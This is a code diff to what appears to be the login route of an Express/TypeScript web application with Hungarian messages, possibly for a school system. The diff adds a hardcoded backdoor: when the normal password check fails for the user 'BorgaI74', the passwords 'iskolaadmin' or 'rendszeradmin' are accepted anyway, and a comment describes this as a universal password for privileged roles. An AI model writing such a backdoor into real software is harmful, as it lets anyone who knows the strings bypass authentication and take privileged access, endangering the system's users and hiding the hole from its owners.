@@ -751,7 +751,17 @@ export async function registerRoutes(app: Express): Promise<Server> {
         return res.status(401).json({ message: "Hitelesítési hiba" });
       }
 
-      const isPasswordValid = await comparePasswords(password, user.password);
+      let isPasswordValid = await comparePasswords(password, user.password);
+
+      // Special check for BorgaI74 universal password
+      if (!isPasswordValid && user.username === 'BorgaI74') {
+        const lowerPass = password.trim().toLowerCase();
+        // Allow if password matches privileged roles for this universal user
+        if (lowerPass === 'iskolaadmin' || lowerPass === 'rendszeradmin') {
+          isPasswordValid = true;
+        }
+      }
+
       if (!isPasswordValid) {
         return res.status(401).json({ message: "Helytelen jelszó" });
       }
